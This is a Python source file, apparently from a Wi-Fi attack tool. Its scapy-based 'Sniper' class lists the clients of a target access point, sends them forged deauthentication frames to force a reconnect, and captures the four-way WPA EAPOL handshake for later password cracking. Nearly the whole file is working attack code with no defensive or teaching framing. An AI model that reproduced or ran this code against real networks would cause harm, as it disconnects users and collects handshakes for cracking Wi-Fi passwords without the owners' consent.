
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.config import conf
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Raw
from scapy.layers.dot11 import Dot11Deauth
from utils import org
import signal
import sys
import time
import threading
import exceptions
import binascii
import os
try:
	from scapy.layers.dot11 import EAPOL
except ImportError:
	from scapy.layers.eap import EAPOL
try:
	long
except NameError:
	long = int

class Sniper:

	__SNIFFER_STATUS = False
	__CONNECTECD_CL = {}
	__CL_COUNTER = {}
	__c_HANDSHAKE = [0, 0, 0, 0]
	__c_TGT = ''
	out__ = ['333300000016', '3333ff9ddffd', 'ffffffffffff', '01005e7ffffa', '333300000001', '01005e0000fb']

	def __init__(self, iface_instance, bssid, essid, channel, timeout, pully, verbose):
		self.iface_instance = iface_instance
		self.iface = self.iface_instance.iface
		self.bssid = bssid
		self.essid = essid
		self.ch = channel
		self.timeout = timeout
		self.pull = pully
		self.verbose = verbose
		#self.channel_shifter = self.channel_shifter(self.ch)

	def __str__(self):
		return self.essid

	def channel_shifter(self, ch):
		self.iface_instance.stop_hopper = 1
		while not self.iface_instance._interface__STATUS_END:
			time.sleep(1)
		self.iface_instance.shift_channel(ch)

	def cl_generator(self):
		try:
			sniff(iface=self.iface, prn=self.cl_generator_replay)
			raise KeyboardInterrupt
		except KeyboardInterrupt:
			if self.verbose:
				self.pull.use(
					f"Clients {self.bssid.replace(':', '').upper()} ({self.pull.DARKCYAN + org(self.bssid).org + self.pull.END}) - {self.pull.GREEN}[Found {len(self.__CONNECTECD_CL)}]{self.pull.END}"
				)
			else:
				self.pull.use(
					f"Clients {self.bssid.replace(':', '').upper()} - [Found {len(self.__CONNECTECD_CL)}]"
				)

	def cl_generator_replay(self, pkt):
		if (
			not pkt.haslayer(Dot11)
			or pkt.getlayer(Dot11).type != long(2)
			or pkt.haslayer(EAPOL)
		):
			return
		__sn = pkt.getlayer(Dot11).addr2
		__rc = pkt.getlayer(Dot11).addr1
		if __sn == self.bssid and __sn.replace(':', '').lower() not in self.out__:
			try:
				if self.__CL_COUNTER[__rc] > 1:
					self.__CONNECTECD_CL[__rc] = self.dbM(pkt)
				else:
					self.__CL_COUNTER[__rc] += 1
			except KeyError:
				self.__CL_COUNTER[__rc] = 1
				if self.verbose:
					self.pull.info(
						f"Station {__rc.replace(':', '').upper()} ({self.pull.DARKCYAN + org(__rc).org + self.pull.END}) {self.pull.RED}<>{self.pull.END} {__sn.replace(':', '').upper()} ({self.pull.DARKCYAN + org(__sn).org + self.pull.END}) {self.pull.YELLOW}[Data Frame]{self.pull.END}"
					)
				else:
					self.pull.info(
						f"Station {__rc.replace(':', '').upper()} {self.pull.RED}<>{self.pull.END} {__sn.replace(':', '').upper()} {self.pull.YELLOW}[Data Frame]{self.pull.END}"
					)
		elif __rc == self.bssid and __rc.replace(':', '').lower() not in self.out__:
			try:
				if self.__CL_COUNTER[__sn] > 1:
					self.__CONNECTECD_CL[__sn] = self.dbM(pkt)
				else:
					self.__CL_COUNTER[__sn] += 1
			except KeyError:
				self.__CL_COUNTER[__sn] = 1
				if self.verbose:
					self.pull.info(
						f"Station {__rc.replace(':', '').upper()} ({self.pull.DARKCYAN + org(__rc).org + self.pull.END}) {self.pull.RED}<>{self.pull.END} {__sn.replace(':', '').upper()} ({self.pull.DARKCYAN + org(__sn).org + self.pull.END}) {self.pull.YELLOW}[Data Frame]{self.pull.END}"
					)
				else:
					self.pull.info(
						f"Station {__rc.replace(':', '').upper()} {self.pull.RED}<>{self.pull.END} {__sn.replace(':', '').upper()} {self.pull.YELLOW}[Data Frame]{self.pull.END}"
					)

	def clients(self):
		LIT__ = {self.bssid: []}
		pwr__ = [pwr for cl, pwr in self.__CONNECTECD_CL.items()]
		pwr__ = sorted(pwr__, reverse=True)
		for pwr in pwr__:
			for tuple_ in self.__CONNECTECD_CL.items():
				if tuple_[1] == pwr and (
					not tuple_[0].startswith('33:33:') or not tuple_[0].startswith('ff:ff:')
				):
					LIT__[self.bssid].append(tuple_)
		return LIT__

	def dbM(self, pkt):
		if pkt.haslayer(RadioTap):
			extra = pkt.notdecoded
			return next(
				(
					-(256 - ord(p))
					for p in extra
					if -(256 - ord(p)) > -90 and -(256 - ord(p)) < -20
				),
				-999,
			)

	def verify_handshake(self, tgt):
		if 0 in self.__c_HANDSHAKE:
			return 0
		if len(self.__c_HANDSHAKE):
			return 1

	def start_eapol_sniffer(self):
		try:
			self.__SNIFFER_STATUS = not bool(0)
			sniff(iface=self.iface, prn=self.eapol_sniffer_replay)
		except ValueError:
			pass

	def eapol_sniffer_replay(self, pkt):
		if pkt.haslayer(EAPOL):
			__sn = pkt[Dot11].addr2
			__rc = pkt[Dot11].addr1
			to_DS = pkt.getlayer(Dot11).FCfield & 0x1 !=0
			from_DS = pkt.getlayer(Dot11).FCfield & 0x2 !=0

			if __sn == self.bssid:
				tgt = __rc
			elif __rc == self.bssid:
				tgt = __sn
			else:
				return

			fNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
			fMIC = "00000000000000000000000000000000"

			if from_DS:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if __sn == self.bssid and nonce != fNONCE and mic == fMIC:
					self.__c_HANDSHAKE[0] = pkt
				elif __sn == self.bssid and nonce != fNONCE:
					self.__c_HANDSHAKE[2] = pkt
			elif to_DS:
				nonce = binascii.hexlify(pkt.getlayer(Raw).load)[26:90]
				mic = binascii.hexlify(pkt.getlayer(Raw).load)[154:186]
				if __rc == self.bssid and nonce != fNONCE and mic != fMIC:
					self.__c_HANDSHAKE[1] = pkt
				elif __rc == self.bssid and nonce == fNONCE and mic != fMIC:
					self.__c_HANDSHAKE[3] = pkt
		return

	def shoot(self, tgt, deauth, _phaz_instance):
		self.__c_TGT = tgt
		if not self.__SNIFFER_STATUS:
			sniffer_thread = threading.Thread(target=self.start_eapol_sniffer)
			sniffer_thread.daemon = True
			sniffer_thread.start()

		while not self.__SNIFFER_STATUS:
			time.sleep(1)

		__pkt_to_cl = RadioTap() / Dot11(addr1=tgt, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
		__pkt_to_ap = RadioTap() / Dot11(addr1=self.bssid, addr2=tgt, addr3=tgt) / Dot11Deauth(reason=7)

		for _ in range(deauth * 1):
			sendp(__pkt_to_cl, iface=self.iface, count=1, verbose=False)
			sendp(__pkt_to_ap, iface=self.iface, count=1, verbose=False)

		if self.verify_handshake(tgt):
			_phaz_instance.THEPOL = tuple(self.__c_HANDSHAKE)